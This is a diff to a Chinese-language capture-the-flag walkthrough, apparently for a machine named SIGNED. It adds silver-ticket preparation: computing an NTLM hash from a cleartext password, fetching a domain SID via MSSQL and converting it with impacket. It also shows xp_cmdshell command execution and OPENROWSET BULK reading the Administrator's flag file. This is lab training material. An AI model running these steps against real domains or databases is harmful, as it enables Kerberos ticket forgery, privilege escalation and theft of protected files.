@@ -194,9 +194,32 @@ mget changelog [anpqy?]?
 <details>
 <summary> MSSQL && TGS</summary>
 
+##### Silver Ticket 银票  | 为了获取 NTLM 密码，我将使用 Python 和明文密码：
+```
+[★]$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
+ef699384c3285c54128a3ee1ddb1a0cc
+```
+##### 从数据库中获取一个 SID                        
+```
+SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users');                                       
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
+```
+##### 把二进制 SID 转换成标准格式 
+```
+[★]$ python3 
+Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+>>> from impacket.dcerpc.v5.dtypes import SID
+>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
+'S-1-5-21-4088429403-1159899800-2753317549-513'
+>>> exit()
+```
+##### 高完整性（High Integrity）服务上下文|但是OPENROWSET使用BULK关键字可以读取使用这些组的文件 
 ```
 SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups" 
-Mandatory Label\High Mandatory Level       Label            S-1-16-12288//高完整性（High Integrity）服务上下文|但是OPENROWSET使用BULK关键字可以读取使用这些组的文件                                                                                                 
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                
 SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents; //从外部数据源读取数据
 ```  
 </details>
